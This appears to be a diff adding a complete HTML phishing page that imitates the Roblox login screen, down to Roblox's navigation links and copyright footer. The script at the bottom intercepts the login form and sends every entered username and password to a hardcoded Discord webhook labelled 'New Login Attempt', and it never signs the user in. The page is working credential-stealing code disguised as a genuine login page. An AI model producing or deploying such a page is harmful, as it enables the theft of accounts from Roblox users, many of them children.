@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Inter Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1a1a1a; /* Dark background matching the overall page */
+            color: #e0e0e0; /* Light text color */
+        }
+        /* Custom scrollbar for a cleaner look */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #333333;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #555;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #777;
+        }
+        /* Specific styles for login form elements to match the image */
+        .login-form-bg {
+            background-color: #2a2a2a; /* Background for the login box itself */
+        }
+        .input-field-bg {
+            background-color: #3a3a3a; /* Background for input fields */
+        }
+        .btn-primary-solid {
+            background-color: #007bff; /* Solid blue for Log In button */
+        }
+        .btn-primary-solid:hover {
+            background-color: #0056b3; /* Darker blue on hover */
+        }
+        .btn-secondary-solid {
+            background-color: #3a3a3a; /* Solid grey for secondary buttons */
+        }
+        .btn-secondary-solid:hover {
+            background-color: #4a4a4a; /* Lighter grey on hover */
+        }
+        /* Message box styling */
+        .message-box {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            z-index: 1000;
+            display: none; /* Hidden by default */
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+        .message-box.success {
+            background-color: #4CAF50; /* Green */
+            color: white;
+        }
+        .message-box.error {
+            background-color: #f44336; /* Red */
+            color: white;
+        }
+        .message-box.show {
+            display: block;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- Message Box -->
+    <div id="messageBox" class="message-box"></div>
+
+    <!-- Header Section -->
+    <header class="bg-gray-950 p-3 flex items-center justify-between sticky top-0 z-50 shadow-lg">
+        <!-- Left Section: Logo and Nav Links -->
+        <div class="flex items-center space-x-6">
+            <div class="flex items-center">
+                <!-- Roblox Logo as text -->
+                <span class="text-xl font-bold text-white">ROBLOX</span>
+            </div>
+            <nav class="hidden md:flex space-x-4 text-gray-300 text-sm font-semibold">
+                <a href="#" class="hover:text-white transition duration-200">Charts</a>
+                <a href="#" class="hover:text-white transition duration-200">Marketplace</a>
+                <a href="#" class="hover:text-white transition duration-200">Create</a>
+                <a href="#" class="hover:text-white transition duration-200">Robux</a>
+            </nav>
+        </div>
+
+        <!-- Right Section: Search and Sign Up -->
+        <div class="flex items-center space-x-3">
+            <div class="relative hidden md:block">
+                <input type="text" placeholder="Search" class="w-full pl-9 pr-3 py-1.5 rounded-lg bg-gray-800 text-white border border-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500 shadow-inner text-sm">
+                <svg class="absolute left-2.5 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+            </div>
+            <button class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-1.5 px-3 rounded-lg shadow-md transition duration-300 ease-in-out text-sm">
+                Sign Up
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content Area - Login Form -->
+    <main class="flex-1 flex items-center justify-center p-4">
+        <div class="login-form-bg shadow-xl p-8 w-full max-w-md border border-gray-700">
+            <h1 class="text-white text-3xl font-bold text-center mb-6">Login to Roblox</h1>
+
+            <!-- Login Form -->
+            <form id="loginForm" class="space-y-4">
+                <input type="text" id="username" placeholder="Username/Email/Phone" class="w-full p-3 rounded-lg input-field-bg text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-200">
+                <input type="password" id="password" placeholder="Password" class="w-full p-3 rounded-lg input-field-bg text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-200">
+                <button type="submit" class="w-full btn-primary-solid text-white font-semibold py-3 rounded-lg transition duration-300 ease-in-out">
+                    Log In
+                </button>
+            </form>
+
+            <div class="text-center mt-4 space-y-2">
+                <a href="#" class="text-blue-400 hover:underline text-sm block font-medium">Forgot Password or Username?</a>
+                <button class="w-full btn-secondary-solid text-white font-semibold py-3 rounded-lg transition duration-300 ease-in-out">
+                    Email Me a One-Time Code
+                </button>
+                <button class="w-full btn-secondary-solid text-white font-semibold py-3 rounded-lg transition duration-300 ease-in-out">
+                    Use Another Device
+                </button>
+            </div>
+
+            <div class="text-center mt-8">
+                <span class="text-gray-400 text-sm">Don't have an account? </span>
+                <a href="#" class="text-blue-400 hover:underline text-sm font-semibold">Sign Up</a>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer Section -->
+    <footer class="bg-gray-900 text-gray-400 p-4 text-center text-xs border-t border-gray-700">
+        <div class="container mx-auto">
+            <div class="flex flex-wrap justify-center space-x-3 md:space-x-6 mt-1">
+                <a href="#" class="hover:text-white transition duration-200">About Us</a>
+                <a href="#" class="hover:text-white transition duration-200">Jobs</a>
+                <a href="#" class="hover:text-white transition duration-200">Blog</a>
+                <a href="#" class="hover:text-white transition duration-200">Parents</a>
+                <a href="#" class="hover:text-white transition duration-200">Gift Cards</a>
+                <a href="#" class="hover:text-white transition duration-200">Help</a>
+                <a href="#" class="hover:text-white transition duration-200">Terms</a>
+                <a href="#" class="hover:text-white transition duration-200">Accessibility</a>
+                <a href="#" class="hover:text-white transition duration-200">Privacy</a>
+                <a href="#" class="hover:text-white transition duration-200">Your Privacy Choices <img src="https://placehold.co/16x16/007bff/ffffff?text=i" class="inline-block ml-1" alt="Privacy Icon"></a>
+            </div>
+            <p class="mt-3 text-gray-500">&copy;2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Function to display messages to the user
+        function showMessage(message, type) {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.textContent = message;
+            messageBox.className = 'message-box show ' + type; // Add type class (success/error)
+            setTimeout(() => {
+                messageBox.classList.remove('show');
+            }, 3000); // Hide after 3 seconds
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            // Corrected webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1395687975597379654/f6qyYR87RNXIEcsHTRXPs9CpF-VAZCshTBwUeb6Eot_EUm-JIx6fJoX7smq7EUkdKqcw';
+
+            // Basic validation
+            if (!username || !password) {
+                showMessage('Please enter both username/email/phone and password.', 'error');
+                return;
+            }
+
+            // Construct the payload for Discord webhook
+            const payload = {
+                content: `**New Login Attempt:**\nUsername: \`${username}\`\nPassword: \`${password}\``
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                console.log('Webhook response status:', response.status);
+                console.log('Webhook response status text:', response.statusText);
+
+                if (response.ok) {
+                    // Clear fields after successful submission (optional)
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                } else {
+                    const errorText = await response.text();
+                    showMessage(`Failed to send login data. Status: ${response.status} - ${errorText}`, 'error');
+                }
+            } catch (error) {
+                console.error('Error sending login data:', error);
+                showMessage('An error occurred while sending login data.', 'error');
+            }
+        });
+
+        // Log "Webhook ready" when the script loads
+        console.log("Webhook ready");
+    </script>
+</body>
+</html>
